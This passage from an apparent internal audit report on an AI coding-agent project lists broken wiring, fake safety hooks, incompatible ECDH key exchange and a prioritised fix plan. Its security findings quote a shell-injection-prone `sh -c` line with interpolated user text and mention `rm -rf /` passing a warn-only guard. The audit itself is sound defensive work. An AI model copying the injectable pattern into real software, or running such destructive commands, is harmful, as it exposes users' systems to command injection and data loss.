|---|------|-------------|-------------|-------------|
| T2.1 | @ references (656 LOC) | DONE | `commands.sendMessage` is deprecated stub → RPCs never reach daemon | **NOT WORKING** |
| T2.2 | Multi-file composer (383 LOC) | DONE | Component not rendered anywhere + `composer.plan` command missing + dot-notation invoke mismatch | **NOT WORKING** |
| T2.3 | Repo map (309 LOC) | DONE | Library used by CLI runtime — functional ✅ | **WORKING** |
| T2.4 | Plan mode (ultraplan.ts) | DONE | Zero references from desktop-app/ — no UI entry point | **NOT WORKING (desktop)** |
| T2.5 | Ghost-text autocomplete | DONE | `InlineCompletion.ts` path: calls deprecated stub. `MonacoEditor.tsx` path: misuses `enhance` RPC | **NOT WORKING** |
| T2.7 | Workflows (5 components) | DONE | Triple failure: deprecated transport + `workflow.start` ignores user nodes + `workflow.save` has no handler | **NOT WORKING** |

### Tier 1, 3, 4, 5, 6 — unchanged from previous assessment

---

## 38. The `sendMessage` Bottleneck — ROOT CAUSE for 3+ Dead Features

**This is the single most impactful infrastructure bug discovered in Round 6.**

`desktop-app/src-tauri/src/commands.rs` line 342 defines:
```rust
#[tauri::command]
async fn send_message(/* ... */) -> Result<String, String> {
    // DEPRECATED: returns only a message ID
    Ok(format!("msg-{}", std::time::SystemTime::now()...))
}
```

This command is the **transport layer** for every component that calls `commands.sendMessage(JSON.stringify({method: "...", params: {...}}))` in TypeScript. Instead of forwarding the JSON-RPC payload to the KAIROS daemon, it returns a static message ID string.

**Features broken by this single stub:**
1. **@ References** (`AtReferences.tsx`) — all 5 RPC methods dead
2. **Ghost-text autocomplete** (`InlineCompletion.ts` path) — `completion.suggest` dead
3. **Workflows** (`WorkflowBuilder.tsx`) — `workflow.start`, `workflow.status`, `workflow.save` dead
4. **Any future component** using `commands.sendMessage` for daemon RPCs

**Features that WORK** bypass `sendMessage` entirely:
- **Computer Use** — uses direct `invoke("capture_screenshot")` to dedicated Tauri commands
- **Chat streaming** — uses `send_message_streaming` (a separate, working command)
- **Settings/Config** — uses dedicated `get_settings`/`save_settings` commands

**Fix**: Replace the `send_message` Tauri command with a real daemon RPC forwarder:
```rust
#[tauri::command]
async fn send_message(state: State<AppState>, payload: String) -> Result<String, String> {
    // Forward JSON-RPC to KAIROS daemon via UDS
    let response = state.daemon_client.send_rpc(&payload).await?;
    Ok(response)
}
```

Estimated effort: ~50 LOC of Rust + IPC client. **Unlocks ~1,700 LOC of existing frontend code.**

---

## 39. The Autonomous Execution Disconnect — VERIFIED

The master audit identified this in §4 (Critical #3). Round 6 traced the complete call chain:

```
CLI: wotann autonomous "fix tests"
  → index.ts:1950 creates LOCAL AutonomousExecutor
    → executor.execute(prompt, callback, verifier)
      → CRASHES with ECANCELED during ESM module loading
      
RPC: autonomous.run (daemon path)
  → kairos-rpc.ts:2708
    → runtime.getAutonomousExecutor()  ← GETTER ONLY, return value DISCARDED
    → runtime.query("[AUTONOMOUS MODE] " + task)  ← SINGLE-SHOT, no loop
    → returns single response
    
NEVER CALLED:
  → runtime.autonomousExecutor.execute()  ← 0 callers in entire codebase
  → OracleWorkerPolicy  ← only imported by autonomous.ts, never invoked
```

**2,000+ lines of fully-implemented autonomous execution code** (8-strategy escalation, oracle consultation, doom loop detection, checkpoint saves) are architecturally complete but electrically disconnected. The RPC handler does a string prefix on a single query instead of invoking the executor.

**Fix**: Replace `kairos-rpc.ts:2708-2732` handler body with:
```typescript
const executor = this.runtime.getAutonomousExecutor();
const result = await executor.execute(task, async (prompt) => {
    let output = "";
    for await (const chunk of this.runtime.query({ prompt })) {
        if (chunk.type === "text") output += chunk.content ?? "";
    }
    return { output, costUsd: 0, tokensUsed: 0 };
}, this.runtime.getVerificationCascade());
return { task, result, timestamp: Date.now() };
```

---

## 40. Hook Enforcement Reality — VERIFIED

6 hooks actually block. 6 are fake guarantees. 3 are hollow no-ops. 10 are legitimately advisory.

### Hooks that BLOCK (return `action: "block"`): 6
1. **SecretScanner** — blocks on API key / token patterns
2. **CostLimiter** — blocks when budget exceeded (PostToolUse)
3. **PreToolCostLimiter** — blocks when session budget exceeded (PreToolUse)
4. **LoopDetection** — blocks at 5 identical calls (warns at 3)
5. **PromptInjectionGuard** — blocks injection patterns in Write content
6. **ArchivePreflightGuard** — blocks unsafe archives

### Fake guarantees (return `action: "warn"` — action PROCEEDS): 6
1. **DestructiveGuard** — `rm -rf /` proceeds with just a log message
2. **ConfigProtection** — config edits proceed
3. **CompletionVerifier** — claims "blocks stop without evidence" but only warns
4. **TDDEnforcement** — claims "blocks impl before tests" but only warns
5. **ReadBeforeEdit** — edits proceed without reading file first
6. **ResultInjectionScanner** — prompt injection in tool results proceeds

### Hollow no-ops (return `action: "allow"` with decorative message): 3
7. **PreCompactWALFlush** — returns JSON string, no actual WAL flush
8. **SessionSummary** — returns timestamp, no actual summarization
9. **MemoryRecovery** — returns static string, no actual memory loading

### Legitimately advisory (warn-only is correct behavior): 10
FrustrationDetection, CorrectionCapture, SimpleCorrectionCapture, AutoLint, AutoTestSuggestion, CacheMonitor, ToolPairValidator, FocusModeToggle, MCPAutoApproval, plus LoopDetection at threshold 3.

---

## 41. ECDH Encryption — THREE Incompatible Implementations

Worse than previously documented. Three separate ECDH implementations exist, each using different parameters:

| Location | Curve | Key Format | Key Derivation | Salt |
|----------|-------|-----------|---------------|------|
| `secure-auth.ts` | P-256 (prime256v1) | Uncompressed (65 bytes, 0x04 prefix) | SHA-256(shared_secret) | none |
| `kairos-rpc.ts:4118` | **X25519** | Raw (32 bytes) | SHA-256(shared_secret + session_salt) | random per-session |
| `companion-server.ts:1205` | P-256 (prime256v1) | Raw (64 bytes) | **HKDF-SHA256** | `"wotann-v1"` |

iOS CryptoKit uses `P256.KeyAgreement.PublicKey(rawRepresentation:)` which expects 64-byte raw format. Desktop's `secure-auth.ts` sends 65-byte uncompressed format with 0x04 prefix. **Key exchange will fail at parse time.**

Even if key exchange succeeded, the key derivation functions produce different AES keys from the same shared secret. Messages encrypted on one side cannot be decrypted on the other.

**Fix**: Standardize all three on P-256 + raw 64-byte format + HKDF-SHA256 with "wotann-v1" salt (matches iOS CryptoKit conventions).

---

## 42. iOS RPC Handlers — VERIFIED REAL (corrects §III original claim)

All 17 originally-flagged methods now have real daemon-side handlers. Verified individually:

| Method | Daemon | Companion | Notes |
|--------|--------|-----------|-------|
| `git.status` | REAL (execFile git) | N/A | Parses porcelain output |
| `git.branches` | REAL | N/A | Local + remote |
| `git.log` | REAL | N/A | Structured commits |
| `git.diff` | REAL | N/A | Raw diff text |
| `screen.capture` | REAL | REAL | macOS screencapture |
| `screen.input` | REAL | REAL | Click/move/scroll |
| `screen.keyboard` | REAL | REAL | Type/keyPress |
| `execute` | REAL | N/A | Sanitized shell exec |
| `briefing.daily` | REAL | REAL | Some fields zero in fallback |
| `meet.summarize` | REAL | REAL | LLM-based summarization |
| `autonomous.cancel` | REAL | REAL | Actual task cancellation |
| `config.sync` | REAL | REAL | Push/pull config |
| `security.keyExchange` | REAL (X25519) | REAL (P-256) | **INCOMPATIBLE CURVES** |
| `continuity.frame` | REAL (ring buffer) | SEMI-STUB (logs, discards) | |
| `continuity.photo` | REAL | REAL | Saves to disk |
| `node.register` | REAL | REAL (no persistence) | |
| `node.result` | REAL | SEMI-STUB (no promise resolve) | |
| `node.error` | REAL | SEMI-STUB (no promise reject) | |
| `clipboard.inject` | REAL | REAL | Cross-platform |
| `quickAction` | REAL (meta-dispatch) | SEMI-STUB (log-only) | |

4 companion-server handlers are SEMI-STUBs: `continuity.frame`, `node.result`, `node.error`, `quickAction`.

---

## 43. Corrected Subsystem Truth Table (supersedes §3)

| Subsystem | §3 Claimed | §3 "Real" | Round 6 Verified |
|-----------|-----------|-----------|-----------------|
| Tool serialization | universal | Dead in 4/5 | **CONFIRMED dead in 4/5** — unchanged |
| Hooks (blocking) | 17+ guards | 23 registered, 10 fake | **6 actually block, 6 fake guarantees, 3 hollow, 10 advisory** |
| Autonomous mode | works | Broken (ECANCELED) | **Confirmed broken + RPC handler is a stub** |
| Desktop views reachable | ~7 | ~7 | **26 render in AppShell — BUT 5 of 6 key features behind broken `sendMessage` transport** |
| iOS RPC methods | 21 missing | 21 missing | **All 17 now have real daemon handlers** |
| Oracle/Worker | — | — | **Module exists, ZERO callers in codebase** |
| Ghost-text autocomplete | — | — | **NOT WIRED (deprecated transport)** |
| @ references | — | — | **NOT WIRED (deprecated transport)** |
| Workflows builder | — | — | **NOT WIRED (triple failure)** |
| Multi-file composer | — | — | **NOT WIRED (not rendered, missing commands)** |
| Computer Use | Zero UI | Zero UI | **WIRED ✅ (only desktop feature with real E2E path)** |
| Plan mode (desktop) | — | — | **NOT WIRED (no UI entry point, library only)** |
| ECDH encryption | Broken (curve) | — | **3 incompatible implementations (2 curves, 3 key derivation methods)** |

---

## 44. Updated Ship-Blocker Punch List (supersedes §4)

### 🔴 CRITICAL — must fix before v0.2.0

**UNCHANGED from §4** (items 0-19 remain valid and unfixed):

Items 0-19 from §4 are still accurate and unfixed, with these corrections:
- Item 2 (ECDH): Severity upgraded — 3 incompatible implementations, not just curve mismatch
- Item 3 (Autonomous): Root cause identified — RPC handler is a stub, not just ECANCELED
- Item 9 (Fake hooks): Precise count: 6 fake guarantees + 3 hollow no-ops

**NEW CRITICAL items from Round 6:**

| # | Issue | File:line | Fix | Effort |
|---|---|---|---|---|
| 20 | **`send_message` Tauri command is deprecated stub** — breaks @ refs, ghost-text, workflows, any RPC via `commands.sendMessage` | `commands.rs:342` | Replace with real daemon RPC forwarder via UDS | 2h |
| 21 | **`autonomous.run` RPC handler never calls executor** — 2,000 LOC of autonomous execution code disconnected | `kairos-rpc.ts:2708-2732` | Replace body with `executor.execute()` call | 1h |
| 22 | **MultiFileComposer not rendered** + `composer.plan` Tauri command missing | `desktop-app/src/` | Import in EditorPanel or WorkshopView + create `composer_plan` Tauri command | 2h |
| 23 | **Event listener leak: 73 `.on()` / 0 `.off()` across src/** — daemon OOM in 30 days | All 23 files | Add cleanup in `close()`/`destroy()` methods | 4h |
| 24 | **No memory retention policy** — audit_trail, auto_capture, trace_analyzer grow unbounded | `audit-trail.ts`, `store.ts`, `trace-analyzer.ts`, `arena.ts` | Add 30-day rolling delete + FIFO caps | 3h |
| 25 | **3 incompatible ECDH implementations** (supersedes §4 item 2) | `secure-auth.ts`, `kairos-rpc.ts:4118`, `companion-server.ts:1205` | Standardize on P-256 + raw 64B + HKDF-SHA256 | 3h |
| 26 | **`workflow.start` ignores user-built nodes** — only looks up builtins by name | `kairos-rpc.ts:3247` | Parse and execute user-defined node graph | 3h |
| 27 | **`workflow.save` RPC handler missing** | `kairos-rpc.ts` | Add handler that persists workflow definition | 1h |

### 🟡 HIGH — should fix before v0.2.0

| # | Issue | Fix | Effort |
|---|---|---|---|
| 28 | **SOUL.md regex bug** — 52 lines Norse identity never reach model | Change regex at `identity.ts:37` to match `## What You Value` | 30 sec |
| 29 | **Thin-client socket path** | Change `thin-client.ts:22` from `daemon.sock` → `kairos.sock` | 30 sec |
| 30 | **10 skills missing YAML frontmatter** — registry loads 76/86 | Add frontmatter to 10 files | 30 min |
| 31 | **ESLint 9 not migrated** — lint silently no-ops | Migrate `.eslintrc.json` to `eslint.config.js` | 30 min |
| 32 | **`turboquant.ts` still not renamed** — 381-line marketing lie | Rename to `ollama-kv-compression.ts` | 10 min |
| 33 | **`claude-agent-sdk` in regular deps** — proprietary under MIT | Move to `peerDependencies` | 10 min |
| 34 | **npm audit: 7 vulnerabilities** (2 high, 5 moderate) | `npm audit fix` | 5 min |
| 35 | **README has 10+ inflated claims** | Reconcile numbers, fix CLI command names | 1h |
| 36 | **`.wotann/.wotann/` nested directory bug** | Fix config init to prevent nesting | 30 min |
| 37 | **iOS 3 dead views coexist with MainShell** | Delete MainTabView, DashboardView, old AgentListView (~1,000 LOC) | 30 min |
| 38 | **`wotann companion start` broken** | Fix Commander.js schema | 15 min |
| 39 | **No native Gemini adapter** — free Google capabilities blocked | Build `gemini-native-adapter.ts` | 4h |
| 40 | **`WOTANN_AUTH_BYPASS=1` unguarded** | Gate behind `NODE_ENV === "test"` | 15 min |
| 41 | **`webhook.ts:104` non-constant-time compare** | Use `timingSafeEqual` | 15 min |
| 42 | **Learning stack activation gates too high** — 30min idle threshold means sessions never consolidate | Lower to 10min or trigger on session end | 1h |

### Dead Code to Delete (~4,500+ LOC)

| File | Lines | Reason |
|------|------:|--------|
| `channels/supabase-relay.ts` | 677 | Zero imports (real is `desktop/supabase-relay.ts`) |
| `channels/knowledge-connectors.ts` | 1,009 | Zero imports |
| `autopilot/never-stop.ts` | 629 | Superseded by `autonomous.ts` |
| `browser/chrome-bridge.ts` | 498 | CDP never established |
| `context/turboquant.ts` | 381 | Marketing lie (after rename) |
| iOS `MainTabView` | ~150 | Replaced by MainShell |
| iOS `DashboardView` | 709 | Replaced by HomeView |
| iOS `AgentListView` | ~150 | Only reached by dead MainTabView |
| `src/ui/themes/` | 0 | Empty directory |

### God Objects to Split (17 files over 800-line limit)

| File | Lines | Priority |
|------|------:|----------|
| `kairos-rpc.ts` | 4,334 | P1 — split by RPC domain |
| `runtime.ts` | 4,205 | P1 — extract subsystem inits |
| `index.ts` | 3,285 | P2 — extract command groups |
| `companion-server.ts` | 2,049 | P2 |
| `kairos.ts` | 1,785 | P2 |
| `store.ts` | 1,602 | P3 |
| `SettingsView.tsx` | 1,558 | P3 |
| `provider-service.ts` | 1,306 | P3 |
| `autonomous.ts` | 1,258 | P3 |
| `OnboardingView.tsx` | 1,211 | P3 |
| `CommandPalette.tsx` | 1,097 | P3 |
| `forgecode-techniques.ts` | 1,075 | P3 |
| `lib.ts` | 1,072 | P3 |

---

## 45. Recommended Execution Order (Updated)

```
IMMEDIATE (today):
  - Delete CREDENTIALS_NEEDED.md, rotate Supabase key
  - Fix SOUL.md regex (30 sec)
  - Fix thin-client socket path (30 sec)
  - npm audit fix (5 min)
  - Rename turboquant.ts (10 min)
  - Move claude-agent-sdk to peerDependencies (10 min)
  - Gate AUTH_BYPASS to test mode (15 min)
  - Fix webhook.ts timing-safe compare (15 min)

WEEK 1 — Transport + Autonomous (highest leverage):
  - Fix send_message Tauri command (2h) ← UNLOCKS @ refs, ghost-text, workflows
  - Wire autonomous.run to executor.execute() (1h) ← UNLOCKS 2,000 LOC
  - Fix ECDH (standardize 3 implementations) (3h)
  - Fix tool serialization in 4 adapters (3h × 4 = 12h) ← UNLOCKS entire harness thesis
  - Add event listener cleanup (4h)
  - Add memory retention policy (3h)
  - Fix 10 skills frontmatter (30 min)
  - Migrate ESLint 9 (30 min)

WEEK 2 — Wiring + Polish:
  - Wire MultiFileComposer (render + create composer_plan) (2h)
  - Fix workflow.start to use user nodes + add workflow.save (4h)
  - Wire Plan mode to desktop UI (2h)
  - Fix shell injection in voice-mode.ts:509 (1h)
  - Fix composer.apply path validation (1h)
  - Fix session.resume path traversal (30 min)
  - Reconcile README claims (1h)
  - Lower learning stack activation gates (1h)
  - Delete ~4,500 LOC dead code (2h)

WEEK 3 — Competitive Parity:
  - Build native Gemini adapter (4h)
  - Port hermes 11 open-model tool parsers (~12h)
  - Port hermes shadow-git auto-checkpointing (~4h)
  - Real TurboQuant vector store via turboquant-wasm (~6h)
  - Port OpenClaw active-memory blocking sub-agent (~4h)

WEEK 4 — Refactor + Infrastructure:
  - Split runtime.ts (4 files, ~800 each) (6h)
  - Split kairos-rpc.ts (5 files by domain) (6h)
  - Delete 3 dead iOS views (30 min)
  - iOS @Observable migration (4h)
  - npm publish + GitHub Releases (4h)
```

**Total critical path: ~80-100 focused hours across 4 weeks.**

---

## 46. README Claims vs Reality — Specific Corrections Needed

| README Claim | Reality | Fix |
|---|---|---|
| "26-layer middleware" | 25 registered, 5 advisory-only | Change to "20+ middleware layers" |
| "42 intel modules" | 30 wired, 7 dead, 5 skeletons | Change to "30+ intelligence modules" |
| "29 orchestration patterns" | 11 wired, 10 half-built, 5 dead | Change to "11 orchestration strategies" |
| "20+ themes" | Themes directory EMPTY (0 files) | Remove claim or say "Obsidian Precision theme" |
| "TurboQuant context extension" | 381-line marketing lie | Remove until real TurboQuant shipped |
| `wotann autopilot` | Command is `wotann autonomous` | Fix command name |
| `wotann compare` | Command is `wotann arena` | Fix command name |
| `wotann debug share` | Does not exist | Remove from table |
| `wotann profile` | Does not exist | Remove from table |
| "proof bundles attached to every completion" | Proof system exists but not attached to every completion | Change to "proof bundle generation available" |
| "Switch mid-session without losing tools" | Tool serialization dead in 4/5 adapters | Remove until fixed |
| "78 commands" | 78 `.command()` registrations — accurate | Keep |

---

## 47. Cross-Session Topic Keys (Round 6)

Round 6 findings preserved in Engram at:
- `audits/wotann-r6-reconciliation` — full reconciliation of Plans 1+2 vs actual state
- `audits/wotann-r6-sendmessage-bottleneck` — the deprecated Tauri transport root cause
- `audits/wotann-r6-autonomous-disconnect` — complete call chain trace
- `audits/wotann-r6-hook-enforcement` — all 25 hooks with actual return values
- `audits/wotann-r6-ecdh-three-implementations` — curve + format + derivation matrix
- `audits/wotann-r6-ios-rpc-verified` — all 60 RPCClient methods verified against handlers
- `audits/wotann-r6-desktop-features-wiring` — 6 features traced from UI to side effect

---

---

---

# ROUND 7 — EXHAUSTIVE SUBSYSTEM VERIFICATION (April 14, 2026 late evening)

> 5 additional Opus-class agents covering every remaining unverified subsystem: middleware execution tracing, provider fallback + capability augmenter, test quality + all 16 channel adapters, voice + cost + context compaction, skill execution + MCP marketplace + sidecar binaries + build verification. Combined with Rounds 1-6: **13 total Opus-class verification agents, 900+ files read.**

---

## 48. Middleware Pipeline — Real Execution Count (supersedes §3 "26-layer" claim)

**26 layers are REGISTERED. On a typical user query producing a text response, 2 layers transform LLM-visible data.**

### Layers that ALWAYS modify LLM-visible data: 2
1. **IntentGate** — classifies prompt intent (implement/fix/refactor), sets context metadata consumed by runtime
2. **SystemNotifications** — injects notification block into user message every ~3 turns

### Layers that modify conditionally (tool results, specific patterns): 16
ForcedVerification (typecheck after TS edits), PreCompletionChecklist (blocks unverified completion claims), PlanEnforcement (blocks complex changes without plan), DoomLoop (blocks after 5 repetitions), SelfReflection (quality flags), OutputTruncation, ToolError, Memory, Uploads, StaleDetection, AutoInstall, VerificationEnforcement, ToolPairValidator, Clarification, NonInteractive, Sandbox.

### Pure advisory — set flags NOTHING reads: 5
- **Guardrail** — sets `guardrailTriggered` but nothing downstream checks it
- **Summarization** — sets `needsSummarization` but nothing acts on it
- **Autonomy** — sets `riskLevel` but runtime has its own classification
- **Frustration** — sets `frustrationDetected` but nothing reads it
- **Cache** — tracks statistics only

### Dead code — conditions structurally never met: 2
- **SubagentLimit** — gated on `taskType === "subagent"` which IntentGate never produces
- **LSP** — reads `ctx.filePath` which no preceding layer ever sets (always `undefined`)

### Metadata-only (context enrichment, no LLM impact): 4
IntentGate (metadata), ThreadData (creates directory), Sandbox (validates dir), FileTrack (tracks file set)

**Corrected claim**: "20 functional middleware layers (2 always-on, 16 conditional, 2 dead)" — not "26-layer pipeline."

---

## 49. Capability Equalization — TWO Critical Wiring Gaps

The core thesis ("every model gets the same intelligence scaffolding") has two disconnects:

### Gap 1: `tools` silently dropped in agent-bridge.ts

`src/core/agent-bridge.ts` lines 78-86 construct `UnifiedQueryOptions` from `WotannQueryOptions`. The `tools` field is **NOT forwarded**:
```
{ model, prompt, systemPrompt, messages, temperature, maxTokens, ... }
// tools: options.tools  ← MISSING
```

This means tool-calling emulation in `capability-augmenter.ts` never activates through the standard query path. Tools from the runtime never reach the adapter layer.

### Gap 2: `parseToolCallFromText()` never called at runtime

`capability-augmenter.ts` exports `parseToolCallFromText()` which parses XML tool calls from freeform text. This function is:
- Exported ✅
- Unit tested (8 tests pass) ✅
- **Never imported or called anywhere in src/** ❌

Even if tools were forwarded and XML was injected into the system prompt, the model's tool-call response would remain as raw text — never parsed back into structured tool calls.

### What works in the augmenter
- **Thinking emulation**: WORKS — "step by step" preamble injected for models without native thinking
- **Vision emulation**: STUB — replaces `[image:]` references with placeholder text `"[Image provided]"` — NO actual OCR or accessibility-tree description. The model gets zero information about image content.

### Impact
The "capability equalization" moat is theoretical, not operational. A 3B Gemma model gets thinking prompts (helpful) but no tool calling (the core value prop) and no vision (placeholder text only).

**Fix**: Add `tools: options.tools` to agent-bridge.ts line 78-86. Wire `parseToolCallFromText()` into the response processing pipeline in `agent-bridge.ts` after the adapter returns text containing XML tool blocks.

---

## 50. Provider Fallback Chain — WORKS

Verified end-to-end:
- `buildFallbackChain()` constructs real ordered chain: preferred → other paid → free
- `resolveNextProvider()` skips rate-limited entries, falls through to free
- `RateLimitManager` tracks limits with real timers, auto-resume, event emission
- `AgentBridge.query()` detects 429 errors, marks providers, cascades — integration-tested
- **Context transfers between providers**: YES — same `queryOptions` reused (prompt, systemPrompt, messages survive)
- 49 tests pass across 4 provider test files

### Format Translator — WORKS
- Anthropic↔OpenAI bidirectional conversion tested
- Ollama handled internally by its adapter (not through translator)
- Complex content (arrays) reduced to `"[complex content]"` — loss of structured info

### Rate Limiter — WORKS
- Real enforcement with per-provider expiry timestamps
- Auto-resume via setTimeout
- `waitOrFallback()` async method with 2-minute cap
- 11 tests with fake timers

---

## 51. Test Quality — GENUINELY STRONG

### Assertion Profile
- **7,222** total `expect()` calls
- **6,584** (77%) use strong matchers (`toBe`, `toEqual`, `toContain`, `toThrow`, `toHaveBeenCalled`)
- **1,509** (21%) use weaker matchers (`toBeDefined`, `toBeTruthy`)

### Behavioral Breakdown (10 files, ~135 tests sampled)
- ~15% smoke tests (instantiation, doesn't throw)
- ~60% behavioral tests (specific input → specific output, state transitions)
- ~25% integration tests (real SQLite, real HTTP, real subprocesses)

### Highlights
- **runtime.test.ts** — session restore verifies messages + provider state, TTSR actually aborts and retries streams
- **middleware.test.ts** — IntentGate classifies 6 prompt types with specific confidence values
- **memory-store.test.ts** — real SQLite database in temp dirs, FTS5 full-text search verification
- **sandbox-executor.test.ts** — real macOS Seatbelt subprocess sandboxing, verifies blocked writes
- **channels.test.ts** — **genuine E2E integration test**: starts KairosDaemon → creates channel gateway → real HTTP POST → verifies response

### Gap
No integration test runs a real query through middleware → provider → LLM → response. Provider tests stop at the adapter boundary (factory returns correct object). Reasonable for CI (no API keys), but the full path is untested.

---

## 52. Channel Adapters — 14/16 REAL (strongest subsystem)

| Adapter | Protocol | Status | Evidence |
|---------|----------|--------|----------|
| **Telegram** | HTTP long-polling | **REAL** | `api.telegram.org/bot<token>/getUpdates`, 4096-char split |
| **Slack** | Socket Mode WebSocket | **REAL** | `apps.connections.open`, envelope_id ack, user name caching |
| **Discord** | Gateway WebSocket | **REAL** | `wss://gateway.discord.gg`, Hello→Identify→heartbeat lifecycle |
| **WhatsApp** | Baileys (dynamic import) | **REAL** | QR terminal, creds.update, presence updates, markdown formatting |
| **Signal** | signal-cli JSON-RPC subprocess | **REAL** | Spawns daemon, parses NDJSON from stdout |
| **iMessage** | SQLite + AppleScript | **REAL** | Reads `~/Library/Messages/chat.db`, sends via `tell application "Messages"` |
| **Teams** | Bot Framework REST + OAuth2 | **REAL** | Client credentials flow, token refresh, activity posting |
| **Matrix** | Client-Server API long-polling | **REAL** | `/sync`, `/account/whoami`, PUT to room timeline |
| **Email** | SMTP + IMAP | **PARTIAL** | Send via nodemailer works; receive needs `imap` package, simplified polling |
| **WebChat** | HTTP server + SSE | **REAL** | `createServer`, POST/GET/SSE endpoints, **integration-tested** |
| **Webhook** | HTTP server | **REAL** | Bearer auth, configurable path, bidirectional |
| **SMS** | Twilio REST API | **REAL** | `/Messages.json`, Basic auth, 1600-char truncation |
| **GitHub Bot** | Webhook + HMAC | **REAL** | SHA-256 signature verification, `@wotann` mention pattern |
| **IDE Bridge** | TCP + JSON-RPC 2.0 | **REAL** | `net.createServer`, 8 methods, connection tracking |
| **IRC** | Raw RFC 1459 | **REAL** | NICK/USER/PASS, PING/PONG, auto-reconnect, 400-byte wrapping |
| **Google Chat** | Webhook outbound | **PARTIAL** | Send via webhook works; receive requires external Cloud Function |

**Zero stubs.** Every adapter has genuine protocol implementation with connection handling, error recovery, and message parsing.

---

## 53. Voice System — TTS Works, STT Requires External Deps

### Out-of-box (zero dependencies)
- **macOS TTS**: WORKS via `say` command
- **Web Speech API TTS**: WORKS in Tauri webview only

### Requires external deps
- **STT**: ALL backends need whisper CLI, OpenAI API key, or Deepgram API key. macOS "system" STT detects as available but returns `"[Audio recorded but no transcription engine available]"` — misleading.
- **Audio recording**: Requires `sox`, `rec`, or `arecord` — none bundled

### Dead code
- **Edge TTS** (`edge-tts-backend.ts`): Complete implementation wrapping Python `edge-tts` — but NEVER integrated into VoiceMode or TTSEngine cascade. Zero imports.
- **VibeVoice** (`vibevoice-backend.ts`): File does not exist

### Shell injection — CONFIRMED at 2 locations
1. `voice-mode.ts:509` — `execFileSync("sh", ["-c", \`echo "${input}" | piper ...\`])` — only `"` escaped
2. `tts-engine.ts:455` — same pattern in `speakPiper()`

Both allow `$()`, backtick, and newline injection via user-provided text.

---

## 54. Cost Tracking — WORKS (honest estimates)

| Component | Status | Detail |
|-----------|--------|--------|
| Cost tracker | **WORKS** | Real token counts × static pricing table (6 models). Persisted daily/weekly/monthly. |
| Cost oracle | **WORKS** | Heuristic complexity → token estimate → cost. Honest confidence scores (25-80%). |
| Tray icon | **WORKS** | Live data from daemon via `cost.current` RPC, 60s refresh, `$0.00` fallback. |
| RPC handlers | **WORKS** | `cost.current`, `cost.snapshot`, `cost.predict` all return real data. |
| `cost.arbitrage` | **FAKE** | Hardcoded prices for 4 providers, always recommends Google. |

Static pricing not from API billing, but functional and honest.

---

## 55. Context Compaction — 4/5 Strategies Work, Auto-Invoked

| Strategy | Status | Mechanism |
|----------|--------|-----------|
| `summarize` | **WORKS** | LLM-based structured summary replacing older messages |
| `evict-oldest` | **WORKS** | Removes non-important middle messages |
| `evict-by-type` | **WORKS** | Prioritized eviction (tool results first) |
| `offload-to-disk` | **PARTIAL** | Offloads to memory map, NOT disk despite name |
| `hybrid` | **WORKS** | 3-stage: summarize → evict-by-type → evict-oldest |

Auto-invocation via `ContextWindowIntelligence` with 5-stage progressive compaction at 50%/70%/85%/95% pressure levels.

Additional context modules verified:
- `repo-map.ts` — **WORKS** (Aider-style, 12+ languages, centrality scoring)
- `virtual-context.ts` — **WORKS** (topic/recency partitioning)
- `context-sharding.ts` — **WORKS** (topic-aware shard management)
- `tiered-loader.ts` — **WORKS** (L0/L1/L2 file extraction)
- `window-intelligence.ts` — **WORKS** (zone-based budget tracking)
- `turboquant.ts` — **REBRANDED OLLAMA FLAGS** (confirmed: maps bits to `q2_K`/`q4_0`/`q8_0`)

---

## 56. Skill Execution — WORKS (prompt injection, max 4 per query)

Skills are injected into the system prompt via `buildSkillActivationPrompt()`:
1. Detected by file path matching, keyword matching, or `always: true` flag
2. Max **4 skills** loaded per query (`MAX_SKILLS_IN_PROMPT = 4`)
3. Each truncated to **2,400 chars** (`MAX_SKILL_CHARS`)
4. Assembled as `"## Active Skill Guidance"` section in system prompt
5. 55 tests pass covering registration, detection, rejection, loading

10 skills without YAML frontmatter are silently ignored by the registry — they exist on disk but are dead weight.

---

## 57. MCP System — Dual Implementation (one vaporware, one real)

| Component | Status | Detail |
|-----------|--------|--------|
| `mcp-marketplace.ts` | **VAPORWARE** | 5 hardcoded entries, `registry.wotann.com` never fetched, `install()` only writes config |
| `registry.ts` MCPRegistry | **WORKS** | Imports real servers from Claude Code (`~/.claude/settings.json`), Cursor, Windsurf, Codex |
| `wotann mcp list` | **WORKS** | Shows real servers imported from Claude Code + builtins |
| `wotann mcp import --from-claude` | **WORKS** | Actually reads and imports MCP configs |
| SkillMarketplace | **WORKS** | GitHub search via `gh search repos --topic wotann-skill`, `installFromGitHub()` clones repos |
| `manifest.ts` | **WORKS** | Local skill/plugin inventory management |

---

## 58. Sidecar Binaries — PLACEHOLDERS

| Binary | Size | Content |
|--------|------|---------|
| `ollama-aarch64-apple-darwin` | 89 bytes | Shell script: `echo "Ollama binary placeholder"` |
| `whisper-aarch64-apple-darwin` | 0 bytes | Empty file |

`sidecar.rs` does NOT reference these binaries. It manages the KAIROS daemon only (launchctl → direct spawn fallback → watchdog). Ollama and Whisper are expected to be installed separately.

---

## 59. Build Status — VERIFIED

| Target | Status | Evidence |
|--------|--------|---------|
| TypeScript (`npm run typecheck`) | **PASSES** | CI verified |
| TypeScript (`npm run build`) | **PASSES** | `dist/index.js` built |
| Tests (`npm test`) | **PASSES** | 3,659/3,660 (1 intentionally skipped) |
| Tauri/Rust (`cargo check`) | **PASSES** | 51.21s, zero errors |
| Desktop typecheck | **PASSES** | CI verified |
| ESLint (`npm run lint`) | **SILENT NO-OP** | ESLint 9 requires flat config; `.eslintrc.json` is legacy |
| iOS SPM dependencies | **NEVER RESOLVED** | No `Package.resolved`, no `checkouts/`, 6 duplicate `.xcodeproj` files |
| `npm pack` | **OVERSIZED** | Ships `.d.ts.map` + `.js.map` (doubles tarball), empty `skills/` in manifest |

---

## 60. Corrected Product Truth Table (Final — supersedes all prior tables)

| Claim | Corrected Reality |
|-------|------------------|
| "26-layer middleware pipeline" | **2 transform LLM data, 16 conditional, 5 advisory, 2 dead** |
| "42 intelligence modules" | **30 wired, 7 dead, 5 skeletons** (unchanged) |
| "29 orchestration patterns" | **11 wired, 10 half-built, 5 dead** (unchanged) |
| "17 providers" | **17 enum values ✅** but tools dead in 4/5 adapters |
| "Capability equalization" | **Thinking works. Tools disconnected. Vision is placeholder text.** |
| "8-layer memory" | **5.5 real.** Vector = TF-IDF, not embeddings. Graph-RAG works. |
| "15 channels" | **14 real, 2 partial** — strongest subsystem, zero stubs |
| "20+ themes" | **0 themes** — directory empty |
| "TurboQuant" | **Ollama KV cache flags rebranded** |
